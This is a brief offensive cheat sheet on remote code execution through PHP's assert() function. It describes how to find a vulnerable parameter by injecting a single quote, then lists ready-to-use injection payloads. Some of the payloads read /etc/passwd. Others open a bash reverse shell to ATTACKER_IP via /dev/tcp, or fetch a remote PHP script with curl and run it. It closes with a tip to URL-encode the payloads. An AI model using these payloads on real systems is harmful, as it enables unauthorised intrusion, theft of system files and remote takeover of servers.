# PHP Assertions RCE

PHP assert() fucntion can be vulnerable to RCE.

### 1) Identification

On a parameter, try to add a single quote (')

    http://domain.local/index.php?page='

If you get a 500 internal server error, it is most likely vulnerable to RCE.

### 2) Payloads to use

Read files from the machine

    ' and die(show_source('/etc/passwd')) or '
    '.system("cat /etc/passwd").'

Get a reverse shell

    ' and die(exec('bash -c "/bin/bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"')) or '
    '.system("curl http://ATTACKER_IP/revshell.php | php").'
    
## You might need to URL encode the payload for it to work (encode special characters too!)
